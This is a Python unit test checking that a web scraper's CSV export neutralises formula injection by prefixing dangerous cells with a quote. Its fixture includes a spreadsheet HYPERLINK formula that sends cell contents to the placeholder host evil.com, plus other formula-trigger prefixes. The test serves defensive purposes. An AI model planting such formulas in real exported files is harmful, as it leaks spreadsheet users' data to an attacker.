import unittest
import sys
import os
import csv
import tempfile
import shutil

# Add parent directory to path so we can import scraper
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from scraper import MarkPositionScraperAsync

class TestCSVInjection(unittest.TestCase):
    def setUp(self):
        # Create a temporary directory
        self.test_dir = tempfile.mkdtemp()
        self.output_json = os.path.join(self.test_dir, "test_links.json")
        self.output_csv = os.path.join(self.test_dir, "test_links.csv")
        self.output_txt = os.path.join(self.test_dir, "test_unique_links.txt")

        self.scraper = MarkPositionScraperAsync(self.output_json, self.output_csv, self.output_txt)

    def tearDown(self):
        # Remove temporary directory
        shutil.rmtree(self.test_dir)

    def test_save_data_sanitization(self):
        # Malicious data
        malicious_data = [
            {
                "title": "=HYPERLINK(\"http://evil.com?x=\"&A1)",
                "date": "2023-01-01",
                "author": "+bad_author",
                "categories": ["@bad_category"],
                "external_link": "-bad_link",
                "domain": "example.com",
                "post_url": "http://example.com/post"
            }
        ]

        # Save data
        self.scraper.save_data(malicious_data)

        # Verify CSV content
        with open(self.output_csv, 'r', encoding='utf-8') as f:
            reader = csv.reader(f)
            header = next(reader) # Skip header
            row = next(reader)

            # Check title (index 0)
            self.assertTrue(row[0].startswith("'"), f"Title not sanitized: {row[0]}")
            self.assertEqual(row[0], "'=HYPERLINK(\"http://evil.com?x=\"&A1)")

            # Check author (index 2)
            self.assertTrue(row[2].startswith("'"), f"Author not sanitized: {row[2]}")
            self.assertEqual(row[2], "'+bad_author")

            # Check categories (index 3)
            # Categories are joined by ", ". If the first one starts with @, the whole string starts with @
            self.assertTrue(row[3].startswith("'"), f"Categories not sanitized: {row[3]}")
            self.assertEqual(row[3], "'@bad_category")

            # Check external_link (index 4)
            self.assertTrue(row[4].startswith("'"), f"External link not sanitized: {row[4]}")
            self.assertEqual(row[4], "'-bad_link")

if __name__ == "__main__":
    unittest.main()
